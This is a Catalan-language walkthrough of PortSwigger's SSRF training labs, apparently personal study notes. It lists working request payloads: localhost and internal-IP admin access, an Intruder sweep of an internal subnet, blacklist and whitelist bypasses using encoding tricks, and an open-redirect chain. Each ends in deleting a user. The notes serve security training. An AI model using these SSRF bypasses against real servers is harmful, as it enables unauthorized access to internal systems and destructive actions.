# Server-side request forgery (SSRF) LABS: https://portswigger.net/web-security/ssrf

### Tots els SSRF es faran dintre la pestanya de 'View Details>Check Stock'

## **Lab 1**: Basic SSRF against the local server

    - Tenim: stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
    Seleccionem tot el paràmetre de 'stockApi' i li fem un URL Decoder: Ctrl+Shift+U.
        RESULTAT: stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1
    - FEM: stockApi=http://localhost/admin&storeId=1
        Per veure el resultat, anem a l'apartat de RENDER en el Burpsuite:
            Tenim: Users (carlos i wiener) amb una opció de 'delete' al costat.
            Per eliminar aquest usuari, que és el que ens demanen, tornem a la part de RAW i busquem per 'carlos'.
            TROBEM: <a href="/admin/delete?username=carlos">Delete</a>
    
    - RESULTAT: stockApi=http://localhost/admin/delete?username=carlos&storeId=1

## **Lab 2**: Basic SSRF against another back-end system

    - TENIM: stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
    - URL DECODE: stockApi=http://192.168.0.1:8080/product/stock/check?productId=2&storeId=1
        - Deixem preparat: stockApi=http://192.168.0.1:8080/admin&storeId=1
        - I ho enviem a l'Intruder.
        - Fem un Clear§.
        - Seleccionem l'últim 1 de: 192.168.0.1
        - Fem un Add§.
        - Pestanya de Payloads.
        - Payload Type: Numbers
        - From: 1 / To: 254 / Step: 1
        - Start Attack
        - Veiem que tots dona un status code 400. Menys al número 70. Dona un 200.
    - FEM: stockApi=http://192.168.0.70:8080/admin&storeId=1
    
    - RESULTAT: stockApi=http://192.168.0.70:8080/admin/delete?username=carlos&storeId=1

## **Lab 3**: SSRF with blacklist-based input filter

    - TENIM : stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
    - URL DECODE: stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1
        - PROVEM: stockApi=http://127.1/admin
        - URL DECODE de 'a' = stockApi=http://127.1/%61dmin
        - URL DECODE de '%' = stockApi=http://127.1/%2561dmin
    
    - RESULTAT: stockApi=http://127.1/%2561dmin/delete?username=carlos

## **Lab 4**: SSRF with filter bypass via open redirection vulnerability

    - TENIM: stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
    - URL DECODE: stockApi=/product/stock/check?productId=2&storeId=1
    - Veiem que no hi ha manera, necessitem anar per una redirecció. A la pàgina hi ha un 'Next Product'. Capturem el paquet
    - TENIM: GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/1.1
        - PROVEM A: GET /product/nextProduct?currentProductId=2&path=https:/google.es HTTP/1.1 -> Ens esta fent la redirecció cap a Google.
    - FEM: stockApi=/product/nextProduct?currentProductId=2%26path=http://192.168.0.12:8080/admin
    
    - RESULTAT: stockApi=/product/nextProduct?currentProductId=2%26path=http://192.168.0.12:8080/admin/delete?username=carlos

## **Lab 5**: Blind SSRF with out-of-band detection

    NEED BurpSuite Collaborator Client (Pro Version) - Pagant €

## **Lab 6**: SSRF with whitelist-based input filter

    - TENIM: stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
    - URL DECODE: stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
    - PROVEM: stockApi=http://localhost:8080
        - OUTPUT: "External stock check host must be stock.weliketoshop.net"
    - PROVEM: stockApi=http://localhost#@stock.weliketoshop.net:8080
      - URL DECODE 1: stockApi=http://localhost%23@stock.weliketoshop.net:8080
      - URL DECODE 2: stockApi=http://localhost%2523@stock.weliketoshop.net:8080 -> STATUS CODE 200 (estem a l'Admin Panel)
    -  FEM: stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin
    
    -  RESULTAT: stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos

## **Lab 7**: Blind SSRF with Shellshock exploitation

    NEED BurpSuite Collaborator Client (Pro Version) - Pagant €